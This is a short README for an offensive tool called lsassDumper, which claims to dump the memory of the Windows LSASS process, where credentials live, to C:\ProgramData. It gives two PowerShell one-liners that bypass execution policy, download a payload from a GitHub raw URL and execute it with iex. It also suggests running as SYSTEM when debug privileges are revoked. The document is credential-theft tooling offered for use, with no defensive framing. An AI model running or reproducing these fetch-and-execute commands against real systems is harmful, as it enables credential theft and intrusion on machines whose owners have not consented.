# lsassDumper

This project provide the necessary payloads to perform an encrypted dump of LSASS in C:\ProgramData


To use hosted payloads (download the b64 stage from this repo at runtime), execute :

`powershell -ep bypass -noexit -c "iex(iwr -useb https://raw.githubusercontent.com/666reda/lsassDumper/main/inj.log)"`

To use the standalone powershell payload, execute :


`powershell -ep bypass -noexit -c "iex(iwr -useb https://raw.githubusercontent.com/666reda/lsassDumper/main/inj2.log)"`

If SeDebugPrivilege is revoked from local admin accounts, you might want to execute the command as SYSTEM. 
